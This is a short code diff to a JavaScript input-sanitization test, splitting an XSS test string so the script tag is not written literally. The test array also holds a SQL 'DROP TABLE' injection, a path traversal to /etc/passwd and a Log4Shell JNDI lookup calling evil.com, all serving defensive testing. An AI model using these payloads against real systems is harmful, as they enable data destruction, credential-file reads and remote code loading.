@@ -509,7 +509,7 @@
 
         function testInputSanitization() {
             var testInputs = [
-                '<script>alert("xss")</script>',
+                '<scr' + 'ipt>alert("xss")</scr' + 'ipt>',
                 'DROP TABLE users;',
                 '../../../etc/passwd',
                 '${jndi:ldap://evil.com/a}'
